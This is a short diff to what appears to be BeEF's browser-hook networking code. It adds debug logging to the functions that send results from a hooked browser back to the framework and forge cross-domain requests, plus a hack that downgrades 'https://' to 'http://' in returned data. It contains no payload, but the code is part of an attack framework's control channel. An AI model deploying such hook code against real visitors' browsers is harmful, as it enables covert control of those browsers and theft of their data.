@@ -107,7 +107,13 @@ beef.net = {
      * @param: {String} results: the data to send
      * @param: {Function} callback: the function to call after execution
      */
+    // This function sends the response back
     send:function (handler, cid, results, callback) {
+      
+      console.log('beef.net.send'+ typeof results + " " + typeof "aaa");
+      if(results && typeof results=="string")  // this line should be commented after hooking the browser because line bellow throws an error
+	results = results.replace("https://","http://");
+      
         if (typeof beef.websocket === "undefined" || (handler === "/init" && cid == 0)) {
             this.queue(handler, cid, results, callback);
             this.flush();
@@ -291,6 +297,7 @@ beef.net = {
     forge_request:function (scheme, method, domain, port, path, anchor, headers, data, timeout, dataType, allowCrossDomain, requestid, callback) {
 
         // check if same domain or cross domain
+        console.log('beef.net.forge_request');
         var cross_domain = true;
 
         if (document.domain == domain.replace(/(\r\n|\n|\r)/gm,"")) { //strip eventual line breaks
